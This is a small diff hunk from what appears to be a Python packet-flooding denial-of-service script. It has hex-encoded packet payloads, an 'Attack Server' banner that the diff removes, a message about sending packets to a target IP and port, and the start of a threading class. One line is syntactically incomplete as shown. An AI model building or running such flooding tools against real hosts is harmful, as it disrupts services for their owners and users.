@@ -16,9 +16,6 @@ Pacotes = [
  codecs.decode('021efd40', 'hex_codec'),
  codecs.decode('081e7eda', 'hex_codec')]
 os.system("cls"
-print ' \033[95m******************************************'
-print ' \033[95m=========== \033[94mAttack Server.... XN Team Nih! \033[95m==========='               
-print ' ******************************************'
 print("\033[91mTOK TOK Paket Buat IP Ma Port \033[92m%s \033[91mDAN MEMBERI ROTI KEPORT \033[92m%s!!"%(ip,port))
 
 class MyThread(threading.Thread):
